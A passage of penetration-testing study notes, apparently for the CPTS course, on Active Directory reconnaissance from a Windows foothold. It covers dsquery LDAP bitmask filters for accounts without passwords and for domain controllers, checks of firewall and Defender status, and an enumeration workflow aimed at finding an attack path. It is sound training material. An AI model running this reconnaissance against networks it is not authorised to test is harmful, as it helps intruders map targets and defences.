dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

This searches for user objects with a specific `userAccountControl` bit set.

The example searches for:

```text
objectCategory = person
        AND
objectClass = user
        AND
UAC bit 32 = set
```

The UAC bit corresponds to:

```text
PASSWD_NOTREQD
```

---

# 🔐 34. Understanding `userAccountControl`

`userAccountControl` is an AD attribute containing **bit flags** that describe account properties.

Instead of storing every setting as a separate simple value, multiple account properties can be represented by individual bits.

Conceptually:

```text
userAccountControl
       │
       ├── Bit 1
       ├── Bit 2
       ├── Bit 4
       ├── Bit 8
       ├── Bit 16
       ├── Bit 32
       ├── ...
       └── Bit 8192
```

Multiple bits can be set simultaneously.

Therefore:

```text
UAC value = combination of multiple flags
```

---

# 🔢 35. LDAP OID Matching Rules

The source introduces three important matching rules.

## `1.2.840.113556.1.4.803`

Bitwise **AND** matching.

Used to determine whether the specified bit(s) are set.

Example:

```text
userAccountControl:1.2.840.113556.1.4.803:=8192
```

Mental model:

```text
"Does this object have this specific bit set?"
```

---

## `1.2.840.113556.1.4.804`

Bitwise **OR** matching.

Used when matching any of the specified bits.

Mental model:

```text
"Does this object have any of these bits set?"
```

---

## `1.2.840.113556.1.4.1941`

Used for **transitive/DN matching**, particularly useful for relationships such as nested group membership.

Mental model:

```text
Object
  ↓
Membership
  ↓
Nested membership
  ↓
Continue through hierarchy
```

> [!important]  
> The three OIDs answer different questions. Do not memorize them as interchangeable LDAP syntax.

---

# 🧠 36. LDAP Filter Syntax

LDAP filters can combine multiple conditions using logical operators.

The three important operators are:

|Operator|Meaning|Mental model|
|---|---|---|
|`&`|AND|🧩 All conditions must match|
|`\|`|OR|🔀 At least one condition must match|
|`!`|NOT|🚫 Condition must not match|

---

# 🧩 37. LDAP AND Example

```text
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

Breakdown:

```text
(
  &
  ├── objectClass=user
  │
  └── userAccountControl bit 64
)
```

Meaning:

> Find objects that are **users AND have UAC bit 64 set**.

The source identifies bit `64` as:

```text
Password Can't Change
```

---

# 🚫 38. LDAP NOT Example

```text
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```

Meaning:

```text
objectClass = user
       AND
NOT UAC bit 64
```

So the filter searches for user objects that **do not** have that UAC bit set.

---

# 🎯 39. Searching for `PASSWD_NOTREQD`

The source uses:

```cmd
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

Example output:

```text
  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```

The important part is that we can move from:

```text
"Show me users"
```

to:

```text
"Show me users satisfying a specific AD attribute condition."
```

That is a major increase in enumeration precision.

---

# 🏢 40. Searching for Domain Controllers

The source uses:

```cmd
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

Example:

```text
 sAMAccountName
 ACADEMY-EA-DC01$
```

The important concept is the UAC bit:

```text
8192
   ↓
SERVER_TRUST_ACCOUNT
   ↓
Computer account associated with a domain controller
```

This allows us to search for DCs without relying on a specialized AD enumeration tool.

---

# 🧬 41. Understanding the Full LotL AD Workflow

```text
                  WINDOWS FOOTHOLD
                         │
                         ↓
                🖥️ HOST ENUMERATION
                         │
              ┌──────────┼──────────┐
              ↓          ↓          ↓
         systeminfo   whoami    Get-Host
              │
              ↓
             🌐 NETWORK
              │
       ┌──────┼───────┐
       ↓      ↓       ↓
   ipconfig  arp   route print
       │      │       │
       └──────┼───────┘
              ↓
       🛡️ DEFENSE ENUMERATION
              │
       ┌──────┼─────────────┐
       ↓      ↓             ↓
     netsh    sc     Get-MpComputerStatus
       │
       ↓
      👥 SESSION CHECK
       │
     qwinsta
       │
       ↓
   🏢 DOMAIN ENUMERATION
       │
   ┌───┼───────────────┐
   ↓   ↓               ↓
  net  WMI          dsquery
   │   │               │
   └───┼───────────────┘
       ↓
   🔎 LDAP FILTERING
       │
       ↓
   🎯 PRECISE OBJECTS
       │
       ↓
   🧩 CORRELATE FINDINGS
       │
       ↓
   🎯 IDENTIFY NEXT TARGET / TECHNIQUE
```

---

# 🧠 42. Native Enumeration vs Offensive Tooling

The major conceptual difference is **not what information can be discovered**, but **how we obtain it**.

|Approach|Example|Main characteristic|
|---|---|---|
|Native Windows|`net`, `dsquery`, WMI|Already present on Windows|
|PowerShell|`Get-*` cmdlets|Flexible scripting/query framework|
|Dedicated AD tooling|PowerView / SharpView|Specialized AD enumeration|
|Relationship collection|SharpHound|Collects AD relationship data|
|Relationship analysis|BloodHound|Analyzes/visualizes collected relationships|

### 🧠 CPTS Mental Model

```text
DEDICATED TOOLS AVAILABLE
        ↓
Use specialized tooling
        ↓
Fast + rich enumeration

DEDICATED TOOLS BLOCKED
        ↓
Living Off the Land
        ↓
PowerShell / WMI / net / dsquery
        ↓
Still enumerate the environment
```

> [!important]  
> LotL is therefore **not a replacement for understanding dedicated tools**. It is an additional methodology for situations where bringing those tools into the environment is impractical or undesirable.

---

# 🕵️ 43. Operational Security Considerations

The source repeatedly emphasizes that native tools can sometimes be less conspicuous than introducing external binaries, but **native does not equal invisible**.

Think in terms of telemetry:

```text
COMMAND EXECUTION
       ↓
Process creation
       ↓
Command line
       ↓
PowerShell logging
       ↓
WMI activity
       ↓
Network connections
       ↓
Authentication events
       ↓
EDR / IDS / SIEM
```

Therefore:

> [!warning]  
> **Do not equate "built into Windows" with "not monitored."**
> 
> Enterprise environments can detect native tools just as they can detect custom tools.

The source specifically notes that organizations may baseline normal activity and detect anomalous behavior.

For example:

```text
Normal user behavior
        ↓
Marketing employee performs normal office tasks

Sudden behavior
        ↓
whoami
net localgroup administrators
LDAP enumeration
PowerShell reconnaissance
        ↓
Behavior differs from baseline
        ↓
Potential alert
```

---

# 🔬 44. CPTS Methodology: Ask Questions, Not Commands

A useful way to remember this section is to stop thinking:

> "Which command do I run?"

and instead think:

> **"What question do I need answered?"**

|Question|Native technique|
|---|---|
|What machine am I on?|`hostname`, `systeminfo`|
|What OS/version is this?|`systeminfo`, `[System.Environment]::OSVersion.Version`|
|Which domain is this host joined to?|`echo %USERDOMAIN%`, `systeminfo`, WMI|
|Which DC does it use?|`echo %logonserver%`, WMI|
|Who am I?|`whoami`|
|Who else is logged in?|`qwinsta`|
|What interfaces exist?|`ipconfig /all`|
|What nearby hosts are known?|`arp -a`|
|What networks can I reach?|`route print`|
|Is the firewall enabled?|`netsh advfirewall show allprofiles`|
|Is Defender running?|`sc query windefend`|
|What is Defender configured to do?|`Get-MpComputerStatus`|
|What domain groups exist?|`net group /domain`|
|Who belongs to a domain group?|`net group "<group>" /domain`|
|What users exist?|`net user /domain`, `dsquery user`|
|What computers exist?|`net view /domain`, `dsquery computer`|
|What shares exist?|`net share`, `net view \\computer /ALL`|
|What domain/forest information exists?|WMI / `dsquery`|
|Which AD objects have specific attributes?|`dsquery * -filter ...`|
|Which machines are domain controllers?|`dsquery` + UAC filtering|

---

# 🧠 45. The Most Important Mental Model

```text
              🪟 I HAVE A WINDOWS FOOTHOLD
                         │
                         ↓
                "WHERE AM I?"
                         │
             hostname / systeminfo
                         │
                         ↓
                "WHO AM I?"
                         │
                       whoami
                         │
                         ↓
              "WHO ELSE IS HERE?"
                         │
                       qwinsta
                         │
                         ↓
              "WHAT NETWORK AM I ON?"
                         │
                  ipconfig /all
                         │
                         ↓
             "WHAT DOES IT KNOW?"
                         │
                arp -a / route print
                         │
                         ↓
             "WHAT DEFENSES EXIST?"
                         │
          netsh / sc / Defender status
                         │
                         ↓
              "WHAT IS THE AD?"
                         │
            net / WMI / dsquery
                         │
                         ↓
             "WHAT EXACT OBJECTS?"
                         │
                  LDAP filters
                         │
                         ↓
              🧩 CORRELATE FINDINGS
                         │
                         ↓
                 🎯 NEXT ACTION
```

---

# 🔥 46. Why `dsquery` + LDAP Is Especially Important

The progression is worth remembering:

```text
dsquery user
    ↓
"Give me users."

dsquery computer
    ↓
"Give me computers."

dsquery *
    ↓
"Give me objects in this location."

dsquery * -filter "..."
    ↓
"Give me objects matching this exact condition."

dsquery * -filter "..." -attr ...
    ↓
"Give me matching objects AND only the attributes I care about."
```

This is the transition from **broad enumeration** to **targeted enumeration**.

---

# 🧩 47. Collector vs Analyzer — Important CPTS Connection

This section also reinforces a broader distinction from previous AD enumeration material.

```text
Native Enumeration
       ↓
COLLECT INFORMATION
       ↓
Users / groups / computers / domains / routes
       ↓
       ┌─────────────────────┐
       │                     │
       ↓                     ↓
  Relationship data     Host/network data
       │                     │
       ↓                     ↓
  BloodHound/etc.       Manual correlation
       │                     │
       └──────────┬──────────┘
                  ↓
           UNDERSTAND ENVIRONMENT
                  ↓
            IDENTIFY TARGETS
```

The important lesson:

> **Enumeration produces facts. Analysis turns those facts into an attack path.**

---

# ⚠️ 48. Technical Accuracy / Operational Notes

> [!warning]  
> Several techniques in this module are presented from an offensive/OPSEC perspective. Their effectiveness depends heavily on the Windows version, security configuration, EDR, logging configuration, and enterprise monitoring.

### Important caveats

- **PowerShell 2.0** may not be installed or enabled on modern systems.
    
- PowerShell downgrade activity can itself generate telemetry.
    
- Lack of native PowerShell logging does **not** mean lack of EDR visibility.
    
- `net1` is not a guaranteed method of evading monitoring.
    
- `arp -a` only shows cached/known mappings, not every host on a subnet.
    
- A route to a network does not guarantee that every system within that network is reachable.
    
- `wmic` is deprecated on modern Windows versions, although WMI itself remains an important Windows management technology.
    
- Native commands can still generate extensive security telemetry.
    

---

# 🎯 49. CPTS Assessment Workflow

When landing on a Windows host and dedicated enumeration tools are unavailable:

```text
1️⃣ IDENTIFY HOST
   │
   ├── hostname
   ├── systeminfo
   └── whoami
   │
   ↓
2️⃣ IDENTIFY USER/SESSION STATE
   │
   ├── whoami
   └── qwinsta
   │
   ↓
3️⃣ IDENTIFY NETWORK
   │
   ├── ipconfig /all
   ├── arp -a
   └── route print
   │
   ↓
4️⃣ IDENTIFY DEFENSES
   │
   ├── netsh advfirewall show allprofiles
   ├── sc query windefend
   └── Get-MpComputerStatus
   │
   ↓
5️⃣ ENUMERATE AD
   │
   ├── net
   ├── WMI
   └── dsquery
   │
   ↓
6️⃣ FILTER
   │
   └── LDAP filters / UAC attributes
   │
   ↓
7️⃣ CORRELATE
   │
   ├── Users
   ├── Groups
   ├── Computers
   ├── Domains
   ├── Routes
   └── Services
   │
   ↓
8️⃣ IDENTIFY NEXT TECHNIQUE
   │
   ↓
🎯 CONTINUE THE ASSESSMENT
```

---

# 🧠 50. Key Takeaways

> [!success]  
> **Living Off the Land = using functionality already present on the Windows host instead of depending on uploaded tooling.**

### Remember these core ideas:

1. **Start with the host.**
    
    - `hostname`
        
    - `systeminfo`
        
    - `whoami`
        
    - `Get-Host`
        
2. **Understand the network.**
    
    - `ipconfig /all`
        
    - `arp -a`
        
    - `route print`
        
3. **Check whether someone else is using the host.**
    
    - `qwinsta`
        
4. **Understand defensive controls.**
    
    - `netsh advfirewall show allprofiles`
        
    - `sc query windefend`
        
    - `Get-MpComputerStatus`
        
5. **Use PowerShell as a native enumeration framework.**
    
    - Modules
        
    - Environment variables
        
    - Execution policy
        
    - History
        
    - Windows/AD functionality
        
6. **Use WMI to retrieve structured Windows management information.**
    
7. **Use `net` for convenient Windows/domain enumeration.**
    
8. **Use `dsquery` when you need direct AD object searching.**
    
9. **Use LDAP filters when broad enumeration is not enough.**
    
10. **Understand UAC bitmasks and LDAP matching rules.**
    
11. **Do not confuse native with invisible.**
    
    - EDR, PowerShell logging, process telemetry, network monitoring, and SIEM systems can still detect native activity.
        
12. **Think in questions, not commands.**
    

```text
WHAT AM I ON?
      ↓
WHO AM I?
      ↓
WHO ELSE IS HERE?
      ↓
WHAT NETWORKS EXIST?
      ↓
WHAT DEFENSES EXIST?
      ↓
WHAT DOES AD CONTAIN?
      ↓
WHAT SPECIFIC OBJECTS MATTER?
      ↓
HOW DO THESE FACTS CONNECT?
      ↓
WHAT SHOULD I ENUMERATE / TEST NEXT?
```

> [!important]  
> The central CPTS lesson from this section is:
> 
> **Even when PowerView, BloodHound, SharpHound, or other dedicated tools are unavailable, a Windows foothold can still provide substantial visibility into the host, network, and Active Directory using native functionality.**
> 
> The skill is not memorizing every command. The skill is knowing **what question you need answered, which native capability can answer it, and how that information changes your next enumeration decision.**

# 🔗 51. Official Tool References

- [PowerShell] — Microsoft PowerShell documentation
    
- [systeminfo] — Microsoft Windows command documentation
    
- [netsh] — Microsoft Netsh documentation
    
- [sc] — Microsoft Service Controller documentation
    
- [Get-MpComputerStatus] — Microsoft Defender PowerShell documentation
    
- [WMI] — Microsoft WMI documentation
    
- [net.exe] — Microsoft Net command documentation
    
- [dsquery] — Microsoft Dsquery documentation
    
- [LDAP search filter syntax] — Microsoft Active Directory documentation